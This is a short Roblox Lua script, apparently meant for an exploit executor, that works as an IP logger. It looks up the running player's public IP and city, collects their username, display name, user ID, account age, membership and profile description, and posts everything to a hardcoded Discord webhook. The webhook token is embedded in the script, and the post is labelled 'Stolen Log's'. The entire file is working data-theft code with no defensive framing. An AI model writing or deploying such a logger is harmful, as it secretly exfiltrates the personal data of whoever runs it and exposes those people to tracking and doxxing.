local IPrequest = game:HttpGet("http://ip-api.com/json/?fields=status,message,city,query")
local result = game:GetService("HttpService"):JSONDecode(IPrequest)

local Notify_Webhook = "https://discord.com/api/webhooks/1414318651971993761/XMz2_n7Kl7P8_e4mk1V7Hl9vy5AtTr06QfQZtUtSUhq2TZ2NoNQ_srTRlf6ChWF0DFHa"
local player = game.Players.LocalPlayer

local function notify_hook()
	-- Thumb API
	local ThumbnailAPI = game:HttpGet("https://thumbnails.roproxy.com/v1/users/avatar-headshot?userIds="..game.Players.LocalPlayer.UserId.."&size=420x420&format=Png&isCircular=true")
	local json = game.HttpService:JSONDecode(ThumbnailAPI)
	local avatardata = json.data[1].imageUrl

	-------- User API Script
	local UserAPI = game:HttpGet("https://users.roproxy.com/v1/users/"..game.Players.LocalPlayer.UserId)
	local json = game.HttpService:JSONDecode(UserAPI)
	-------- Description Data
	local DescriptionData = json.description
	-------- Created Data
	local CreatedData = json.created

	local send_data = {
		["username"] = "IP Logger",
		["avatar_url"] = "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTrPo0-hPIr3z9c5ypXEEGhEt-t0LY0czVZBw&s",
		["content"] = "Someone injected our ip logger !",
		["embeds"] = {
			{
				["title"] = "Stolen Log's",
				["description"] = "**Game : https://www.roblox.com/games/"..game.PlaceId.."**\n**Profile : https://www.roblox.com/users/"..player.UserId.."/profile**\n**Job ID : "..game.JobId.."**\n** IP : " .. result.query .. "**",
				["color"] = 3447003,
				["fields"] = {
					{
						["name"] = "Username",
						["value"] = player.Name,
						["inline"] = true
					},
					{
						["name"] = "Display Name",
						["value"] = player.DisplayName,
						["inline"] = true
					},
					{
						["name"] = "User ID",
						["value"] = player.UserId,
						["inline"] = true
					},
					{
						["name"] = "Account Age",
						["value"] = player.AccountAge.." Day",
						["inline"] = true
					},
					{
						["name"] = "Membership",
						["value"] = player.MembershipType.Name,
						["inline"] = true
					},
					{
						["name"] = "Account Created Day",
						["value"] = string.match(CreatedData, "^([%d-]+)"),
						["inline"] = true
					},
					{
						["name"] = "Profile Description",
						["value"] = "```\n"..DescriptionData.."\n```",
						["inline"] = true
					}
				},
				["footer"] = {
					["text"] = "IP Log",
					["icon_url"] = "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTrPo0-hPIr3z9c5ypXEEGhEt-t0LY0czVZBw&s"
				},
				["thumbnail"] = {
					["url"] = avatardata
				}
			}
		},
	}

	local headers = {
		["Content-Type"] = "application/json"
	}

	request({
		Url = Notify_Webhook,
		Method = "POST",
		Headers = headers,
		Body = game:GetService("HttpService"):JSONEncode(send_data)
	})
end

notify_hook()
